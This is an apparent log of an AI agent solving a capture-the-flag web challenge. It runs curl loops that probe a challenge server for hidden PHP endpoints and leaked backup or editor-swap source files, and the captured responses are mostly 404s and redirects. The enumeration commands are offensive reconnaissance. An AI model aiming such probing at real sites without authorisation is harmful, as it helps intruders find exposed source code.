+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+
+=== /pages/add.php.bak ===
+HTTP/1.1 404 Not Found
+Content-Length: 326
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:12 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+
+=== /pages/note.php.bak ===
+HTTP/1.1 404 Not Found
+Content-Length: 327
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:12 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+Authenticated fragments disclose more absolute paths and helper names (`get_notes()` in `/var/www/html/pages/notes.php` and `/var/www/html/pages/note.php`), but backup/source extensions are 404. I’m checking the adjacent action endpoints exposed by the pages for the same kind of leak.
+exec
+/bin/bash -lc "for path in '/add.php' '/export.php' '/export.php?type=zip' '/export.php?type=tar' '/note.php' '/delete.php' '/download.php' '/config.php' '/functions.php' '/lib.php' '/db.php' '/init.php'; do printf '\\n=== %s ===\\n' \""'$path"; curl -sS -i --max-time 8 "http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com$path" | sed -n '"'1,25p'; done" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+ succeeded in 1213ms:
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:38:20 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=728c73c27cc8b2fe787a13c007a36245; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== /export.php?type=zip ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:38:20 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=fd54bb502474cf7ef764d31524abfcc8; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== /export.php?type=tar ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:38:21 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=5f7dbf7eb3cd814cd80d65bea33276ba; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== /note.php ===
+HTTP/1.1 404 Not Found
+Content-Length: 317
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:21 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /note.php was not found on this server.</p>
+<hr>
+<address>Apache/2.4.38 (Debian) Server at af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com Port 80</address>
+</body></html>
+
+=== /delete.php ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:38:21 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=91cf4875008f3cf0768ab831fa241947; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== /download.php ===
+HTTP/1.1 404 Not Found
+Content-Length: 321
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:21 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /download.php was not found on this server.</p>
+<hr>
+<address>Apache/2.4.38 (Debian) Server at af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com Port 80</address>
+</body></html>
+
+=== /config.php ===
+HTTP/1.1 200 OK
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:38:21 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== /functions.php ===
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:21 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /functions.php was not found on this server.</p>
+<hr>
+<address>Apache/2.4.38 (Debian) Server at af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com Port 80</address>
+</body></html>
+
+=== /lib.php ===
+HTTP/1.1 200 OK
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:38:21 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== /db.php ===
+HTTP/1.1 404 Not Found
+Content-Length: 315
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:21 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /db.php was not found on this server.</p>
+<hr>
+<address>Apache/2.4.38 (Debian) Server at af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com Port 80</address>
+</body></html>
+
+=== /init.php ===
+HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:38:21 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=9f523db37f67dea362ec6cb0be3fb34f; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+Adjacent root files exist (`config.php`, `lib.php`, `init.php`, plus `add.php`, `delete.php`, `export.php`), but normal PHP execution returns empty/redirect responses. I’m doing a final source-disclosure extension pass on these specific discovered files.
+exec
+/bin/bash -lc "for base in index login add delete export config lib init; do for ext in '~' '.bak' '.old' '.save' '.swp' '.swo' '.txt' '.phps' '.php.bak' '.php~' '.php.save' '.php.old' '.php.txt'; do path=\"/"'${base}${ext}"; case "$ext" in .php*) path="/${base}${ext}";; *) path="/${base}.php${ext}";; esac; printf '"'\\n=== %s ===\\n' \""'$path"; curl -sS -i --max-time 6 "http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com$path" | sed -n '"'1,9p'; done; done" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+ succeeded in 12244ms:
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:30 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /index.php.old ===
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:30 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /index.php.save ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:30 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /index.php.swp ===
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:30 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /index.php.swo ===
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:30 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /index.php.txt ===
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:30 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /index.phps ===
+HTTP/1.1 404 Not Found
+Content-Length: 319
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:30 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /index.php.bak ===
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:30 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /index.php~ ===
+HTTP/1.1 404 Not Found
+Content-Length: 319
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:31 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /index.php.save ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:31 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /index.php.old ===
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:31 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /index.php.txt ===
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:31 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /login.php~ ===
+HTTP/1.1 404 Not Found
+Content-Length: 319
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:31 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /login.php.bak ===
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:31 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /login.php.old ===
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:31 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /login.php.save ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:31 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /login.php.swp ===
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:31 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /login.php.swo ===
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:32 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /login.php.txt ===
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:32 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /login.phps ===
+HTTP/1.1 404 Not Found
+Content-Length: 319
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:32 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /login.php.bak ===
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:32 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /login.php~ ===
+HTTP/1.1 404 Not Found
+Content-Length: 319
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:32 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /login.php.save ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:32 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /login.php.old ===
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:32 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /login.php.txt ===
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:32 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /add.php~ ===
+HTTP/1.1 404 Not Found
+Content-Length: 317
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:32 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /add.php.bak ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:33 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /add.php.old ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:33 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /add.php.save ===
+HTTP/1.1 404 Not Found
+Content-Length: 321
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:33 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /add.php.swp ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:33 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /add.php.swo ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:33 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /add.php.txt ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:33 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /add.phps ===
+HTTP/1.1 404 Not Found
+Content-Length: 317
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:33 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /add.php.bak ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:33 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /add.php~ ===
+HTTP/1.1 404 Not Found
+Content-Length: 317
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:34 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /add.php.save ===
+HTTP/1.1 404 Not Found
+Content-Length: 321
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:34 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /add.php.old ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:34 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /add.php.txt ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:34 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /delete.php~ ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:34 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /delete.php.bak ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:34 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /delete.php.old ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:34 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /delete.php.save ===
+HTTP/1.1 404 Not Found
+Content-Length: 324
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:34 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /delete.php.swp ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:34 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /delete.php.swo ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:35 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /delete.php.txt ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:35 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /delete.phps ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:35 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /delete.php.bak ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:35 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /delete.php~ ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:35 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /delete.php.save ===
+HTTP/1.1 404 Not Found
+Content-Length: 324
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:35 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /delete.php.old ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:35 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /delete.php.txt ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:35 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /export.php~ ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:35 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /export.php.bak ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:36 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /export.php.old ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:36 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /export.php.save ===
+HTTP/1.1 404 Not Found
+Content-Length: 324
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:36 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /export.php.swp ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:36 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /export.php.swo ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:36 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /export.php.txt ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:36 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /export.phps ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:36 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /export.php.bak ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:36 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /export.php~ ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:37 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /export.php.save ===
+HTTP/1.1 404 Not Found
+Content-Length: 324
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:37 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /export.php.old ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:37 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /export.php.txt ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:37 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /config.php~ ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:37 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /config.php.bak ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:37 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /config.php.old ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:37 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /config.php.save ===
+HTTP/1.1 404 Not Found
+Content-Length: 324
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:37 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /config.php.swp ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:38 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /config.php.swo ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:38 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /config.php.txt ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:38 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /config.phps ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:38 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /config.php.bak ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:38 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /config.php~ ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:38 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /config.php.save ===
+HTTP/1.1 404 Not Found
+Content-Length: 324
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:38 GMT
